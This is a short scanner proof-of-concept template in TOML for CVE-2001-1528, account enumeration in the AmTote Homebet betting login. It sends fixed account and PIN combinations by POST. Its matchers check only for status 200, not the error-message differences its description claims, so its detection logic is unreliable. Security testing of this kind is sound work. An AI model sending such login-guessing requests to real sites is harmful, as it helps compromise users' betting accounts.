[info]
author = "ave"
description = "检测 AmTote International Homebet 在线投注程序是否存在账号信息泄露漏洞，通过发送不同账号和 PIN 码组合，根据返回错误信息差异判断有效账号"
id = "POC-AVE-2001-0560"
name = "AmTote Homebet 账户信息暴力破解漏洞 PoC"
severity = "medium"
tags = ["cve-2001-1528"]
vuln_id = [
    "CVE-2001-1528",
    "AVE-2001-0560",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/homebet/login"
protocol = "http"

[poc.requests.body]
content = "account_number=99999999&pin=0000"
type = "raw"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/homebet/login"
protocol = "http"

[poc.requests.body]
content = "account_number=99999999&pin=1234"
type = "raw"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
